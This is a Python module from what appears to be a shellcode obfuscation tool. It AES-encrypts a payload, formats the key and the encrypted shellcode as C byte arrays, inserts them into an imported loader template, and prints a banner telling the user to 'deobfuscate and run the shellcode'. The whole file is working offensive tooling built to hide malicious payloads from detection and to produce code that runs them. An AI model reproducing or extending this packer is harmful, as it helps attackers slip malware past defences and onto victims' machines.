import sys
sys.path.append('..')
from Encoder.LoaderStrings import aes_deobfuscation_code
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
import hashlib


def AESencrypt(plaintext, key):
    k = hashlib.sha256(key).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext, key


def generate_aes_output(key, ciphertext, L):
    global aes_deobfuscation_code
    aesKey = 'char AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in key) + ' };'
    aesShellcode = 'unsigned char AESshellcode[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'
    
    aes_deobfuscation_code = aes_deobfuscation_code.replace("char AESkey[] =", aesKey)
    aes_deobfuscation_code = aes_deobfuscation_code.replace("unsigned char AESshellcode[] =", aesShellcode)


    if L==1:
        print("\n\n###### USE THE FOLLOWING CODE TO DEOBFUSCATE AND RUN THE SHELLCODE ######\n\n")
        print(aes_deobfuscation_code)
    else:
        print(aesKey)
        print(aesShellcode)
    





